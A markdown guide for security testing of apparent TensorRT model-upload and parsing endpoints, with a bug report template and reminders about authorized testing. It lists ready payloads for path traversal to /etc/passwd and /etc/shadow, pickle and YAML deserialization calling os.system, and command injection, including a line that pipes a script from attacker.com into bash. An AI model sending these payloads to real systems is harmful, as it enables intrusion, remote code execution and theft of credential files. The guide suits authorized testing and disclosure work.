# TensorRT Vulnerability Testing Guide

## Target: TensorRT Model Parsing (.engine / .trt / .mytrtfile)

### Identified High-Priority Endpoints

| Endpoint | Vulnerability | Risk | Score |
|----------|--------------|------|--------|
| `/api/model/validate` | IDOR | MEDIUM | 22 |
| `/api/optimizer/tensorrt` | IDOR | MEDIUM | 22 |
| `/api/model/upload` | RCE | HIGH | 18 |
| `/api/model/cmd` | AUTH/RCE | HIGH | 20 |

---

## 🚨 HIGH PRIORITY VULNERABILITY TESTS

### 1. Path Traversal in Model Path (HIGH)

**Target:** `/api/model/validate?file=../../../etc/passwd`

**Test Payloads:**
```
../../../etc/passwd
../../../../etc/shadow
/tmp/malicious.engine
../app/config.py
/etc/cuda/cuda.conf
```

**Expected Behavior:** File contents leak or arbitrary file read

---

### 2. Deserialization RCE (CRITICAL)

**Target:** `/api/model/load` or `/api/model/upload`

**Test Payloads:**
```python
# Crafted TensorRT engine with malicious plugin
# Trigger heap overflow in parser
# Custom layer with code execution

# For pickle-based parsers:
import pickle
class Malicious:
    def __reduce__(self):
        return (os.system, ('id',))

# For YAML parsers:
!!python/object/apply:os.system ['id']
```

---

### 3. Integer Overflow in Layer Count (HIGH)

**Target:** Any model parsing endpoint

**Test Payload:**
```python
# Modify engine header:
# Set layer_count to 0xFFFFFFFF (4294967295)
# Or set max_batch_size to 0xFFFFFFFF
```

---

### 4. Heap Overflow in Tensor Descriptor (HIGH)

**Target:** `/api/model/parse`

**Test Payload:**
```python
# Craft malformed tensor dimensions:
# Set dims[0] = 0x7FFFFFFFFFFFFFFF
# Set dims[1] = 0x7FFFFFFFFFFFFFFF
```

---

### 5. Command Injection via Model Path (CRITICAL)

**Target:** `/api/model/cmd?cmd=nvidia-smi`

**Test Payloads:**
```
nvidia-smi; cat /etc/passwd
nvidia-smi && wget http://attacker.com/shell.sh | bash
$(whoami)
`id`
nvidia-smi|curl http://attacker.com
```

---

### 6. Malicious TensorRT Plugin (CRITICAL)

**Target:** Custom plugin loader

**Test Payload:**
```cpp
// Malicious IPluginV2 implementation
class MaliciousPlugin : public nvinfer1::IPluginV2 {
    // Code execution on plugin load
    // Data exfiltration via plugin
    // Backdoor triggers on specific inputs
};
```

---

## 📊 MEDIUM PRIORITY TESTS

### 7. Model File Upload DoS

**Target:** `/api/model/upload`

**Test Payloads:**
```python
# Extremely large engine file (>10GB)
# Zeros-filled engine with corrupted magic bytes
# Engine with circular layer references
```

---

### 8. Memory Corruption via Custom Ops

**Target:** `/api/model/load`

**Test Payloads:**
```python
# Malformed ONNX converted to TRT
# Custom plugin with buffer overflow
# Unsupported dtype in tensor
```

---

### 9. ZipSlip/TarSlip in Model Extraction

**Target:** Model upload endpoints

**Test Payload:**
```
../../../../etc/passwd
../../../app/secrets.py
```

---

## 🎯 IDOR TESTING (Use BugHunter Payloads)

### Test Different User IDs:
```
user_id=1
user_id=2  
user_id=999
user_id=admin
user_id=0
```

### Check for Horizontal Privilege Escalation:
- User A can access User B's models
- Admin models accessible to regular users

---

## 🔧 Quick Test Commands

```bash
# Test path traversal
curl -X POST "https://target.com/api/model/validate?file=../../../etc/passwd"

# Test command injection
curl -X POST "https://target.com/api/model/cmd?cmd=id"

# Test malicious file upload
curl -X POST -F "file=@malicious.engine" https://target.com/api/model/upload

# Test with BugHunter
python main.py --attack-ready --input tensorrt_traffic.json
```

---

## 📋 Bug Report Template

```
## Vulnerability Title
[TensorRT] [CRITICAL/HIGH/MEDIUM] - [Vulnerability Type]

## Target
- Endpoint: /api/model/[endpoint]
- Parameter: [vulnerable param]
- File Format: .engine / .trt / .mytrtfile

## Description
[Detailed description of the vulnerability]

## Steps to Reproduce
1. Navigate to [endpoint]
2. Modify [parameter] to [malicious value]
3. Observe [unexpected behavior]

## Impact
[Security impact - code execution, data leak, DoS, etc.]

## Evidence
[POC request/response]

## Recommended Fix
[How to fix the vulnerability]
```

---

## 🛡️ Safe Testing Reminders

⚠️ **Only test on systems you have permission to test**

⚠️ **Use --attack-ready mode with confirmation**

⚠️ **Test with minimal payloads first**

⚠️ **Document all findings for responsible disclosure**
